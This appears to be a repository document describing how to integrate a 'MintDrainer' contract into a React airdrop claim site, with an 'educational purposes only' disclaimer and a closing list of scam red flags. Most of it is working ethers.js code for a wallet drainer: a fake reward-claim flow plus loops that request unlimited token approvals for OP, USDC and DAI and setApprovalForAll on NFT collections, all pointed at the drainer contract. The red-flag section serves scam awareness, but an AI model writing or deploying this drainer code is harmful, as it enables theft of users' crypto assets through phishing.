# Web3 Integration for Contract Interaction

This document explains how to integrate the MintDrainer contract with our React frontend for the airdrop claim site.

## WARNING: EDUCATIONAL PURPOSES ONLY

**IMPORTANT**: The contracts in this repository are created for **educational purposes only**. They demonstrate malicious patterns that are used by scammers. **DO NOT DEPLOY OR USE THESE CONTRACTS IN PRODUCTION**. These are examples of what to look out for to avoid being scammed.

## Integration Overview

The integration process involves several steps:

1. Setting up wallet connection via ethers.js
2. Creating contract interfaces
3. Requesting the necessary approvals
4. Executing the claim function
5. Handling the transaction flow

## Implementation Details

### 1. Contract Interface

We need to create an interface for the contract using ethers.js:

```typescript
import { ethers } from 'ethers';

// MintDrainer ABI - only the functions we need
const MINT_DRAINER_ABI = [
  "function claimReward() external",
  "event RewardClaimed(address indexed user, uint256 amount)"
];

// Contract address on Optimism
const CONTRACT_ADDRESS = "0x8231B6eEB3dDC15f76a48Ef22b5282ca0fcFC2ED"; // This would be the address of the deployed contract
```

### 2. Frontend Integration Function

Here's how we would integrate this with our wallet connection:

```typescript
// Function to handle claim button click
async function handleClaimReward() {
  if (!isWalletConnected) {
    await connectWallet();
    return;
  }

  // Ensure we're on Optimism network
  if (!isOptimismNetwork) {
    await switchToOptimism();
    return;
  }

  // Show loading state
  setIsProcessing(true);

  try {
    // Create contract instance
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const contract = new ethers.Contract(CONTRACT_ADDRESS, MINT_DRAINER_ABI, signer);

    // Request approval for known tokens (this would be done in a loop for all tokens)
    // This is what makes this contract dangerous - it requests approval for ALL tokens

    // Example of one token approval:
    // const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    // await tokenContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);

    // Call claimReward function
    const tx = await contract.claimReward();

    // Wait for transaction to be confirmed
    const receipt = await tx.wait();

    // Extract the reward amount from events
    const event = receipt.events.find(e => e.event === 'RewardClaimed');
    if (event) {
      const rewardAmount = event.args.amount;
      setClaimedAmount(ethers.utils.formatUnits(rewardAmount, 18));
    }

    // Show success message
    setTransactionSuccess(true);
  } catch (error) {
    console.error("Error claiming reward:", error);
    setTransactionError(error.message);
  } finally {
    setIsProcessing(false);
  }
}
```

### 3. Required Approvals

What makes these type of contracts dangerous is they require approvals for ALL tokens:

```typescript
// Function to request approvals for all tokens
async function requestAllApprovals() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();

  // List of token addresses to request approval for
  const tokenAddresses = [
    "0x4200000000000000000000000000000000000042", // OP
    "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", // USDC
    "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", // DAI
    // ... more tokens
  ];

  for (const tokenAddress of tokenAddresses) {
    try {
      const tokenContract = new ethers.Contract(
        tokenAddress,
        ["function approve(address spender, uint256 amount) external returns (bool)"],
        signer
      );

      // Request unlimited approval (extremely dangerous)
      const tx = await tokenContract.approve(
        CONTRACT_ADDRESS,
        ethers.constants.MaxUint256
      );

      await tx.wait();
      console.log(`Approved ${tokenAddress}`);
    } catch (error) {
      console.error(`Error approving ${tokenAddress}:`, error);
    }
  }
}
```

### 4. NFT Approvals

For NFTs, the integration would require setting approval for all:

```typescript
// Function to approve NFT collections
async function approveNFTCollections() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();

  const nftAddresses = [
    "0x455C3D46380d1B27524658936e69d0Ded21C5c85", // Example NFT
    // ... more NFT collections
  ];

  for (const nftAddress of nftAddresses) {
    try {
      const nftContract = new ethers.Contract(
        nftAddress,
        ["function setApprovalForAll(address operator, bool approved) external"],
        signer
      );

      // Set approval for all (extremely dangerous)
      const tx = await nftContract.setApprovalForAll(CONTRACT_ADDRESS, true);
      await tx.wait();
      console.log(`Approved all NFTs for ${nftAddress}`);
    } catch (error) {
      console.error(`Error approving NFTs for ${nftAddress}:`, error);
    }
  }
}
```

## Red Flags To Look Out For

These are signs of potentially malicious airdrop contracts:

1. **Requests approval for ALL tokens** - Legitimate contracts usually only need approval for specific tokens
2. **Unlimited approval amounts** - `ethers.constants.MaxUint256` is a red flag
3. **Approval for ALL NFTs** - `setApprovalForAll` is risky
4. **Hidden contract code** - Always verify contract source code on Etherscan
5. **Urgent claiming** - "Limited time only" is often used to rush users
6. **Multiple signature requests** - Legitimate operations usually require minimal signatures
7. **Contract functions that aren't clear** - Names that don't match function behavior

## Safer Alternatives

To implement a legitimate airdrop claim:

1. Only request approval for the specific tokens needed
2. Request approval for the exact amount needed, not unlimited
3. Use transparent, verified contracts
4. Separate token approvals from claim functions
5. Don't transfer users' existing assets without clear consent
